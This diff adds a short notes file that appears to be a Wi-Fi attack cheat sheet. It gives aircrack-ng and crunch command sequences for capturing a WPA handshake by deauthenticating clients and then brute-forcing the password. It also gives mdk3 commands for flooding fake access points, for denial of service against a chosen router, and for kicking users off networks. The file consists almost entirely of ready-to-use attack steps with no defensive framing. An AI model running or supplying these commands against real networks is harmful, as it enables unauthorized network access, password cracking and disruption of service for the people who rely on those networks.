@@ -1,0 +1,64 @@
+change mode root
+
+--- find password wifi ----
+
+- airmon-ng
+- airmon-ng start <Interface>
+- airmon-ng check kill
+- iwconfig //see Interface change mode
+- airodump-ng <Interface> //search find bssid
+
+= next
+
+- airodump-ng -w <Capname> --bssid <BSSID> -c <Channel> <Interface> //it's create file cap in path present
+- aireplay-ng -0 10 -a <BSSID> <Interface> //handshake
+
+= next
+
+- crunch 8 10 0123456789 | aircrack-ng <CAP FILE> -w - -b <BSSID>
+- or
+- crunch 8 10 0123456789 -t 08@@@@@@@@ | aircrack-ng <CAP FILE> -w - -b <BSSID> //crunch option -t is start which character 08
+
+
+
+---- fake access point by mdk3 ----
+- airmon-ng //find phy Interface and select Interface
+- airmon-ng start <Interface>
+- iwconfig <Interface mon> channel <Channel>
+- mdk3 <Interface mon> b -c <Channel>
+- or 
+- mdk3 <Interface mon> b -c <Channel> -f <PATH NAME> //create access point by list .txt 
+
+
+
+--- DoS Wifi by mdk3 mode a ---
+- airmon-ng
+- airmon-ng check kill
+- airodump-ng <Interface>
+- // Find BSSID which will DoS
+- airodump-ng -c <Channel> --bssid <BSSID> <Interface>
+- mdk3 <Interface> a -a <BSSID> -m
+- or 
+- mdk3 <Interface> a -i <BSSID> -m //kick station all
+
+
+--- kick user to router (black list | White list) by mdk3 mode d ---
+- mdk3 <Interface> d -b <blacklist.txt> -c <Channel> // -b Black list
+- mdk3 <Interface> d -w <whitelist.txt> -c <Channel> // -w Whitel list
+- mdk3 <Interface> d // kick station all channel
+- mdk3 <Interface> d -c <Channel> // kick station this channel
+
+- airmon-ng
+- airmon-ng check kill
+- airodump-ng <Interface> //no Interface mon mode
+- // select bssid and channel
+- airodump-ng -c <Channel> --bssid <BSSID> <Interface> //not -w have no cap file, find station macaddress in this access point 
+
+
+
+---- How to stop <Interface mon> ----
+- airmon-ng stop <Interface mon>
+
+service NetworkManager restart
+service network-manager restart
+service wpa_supplicant restart
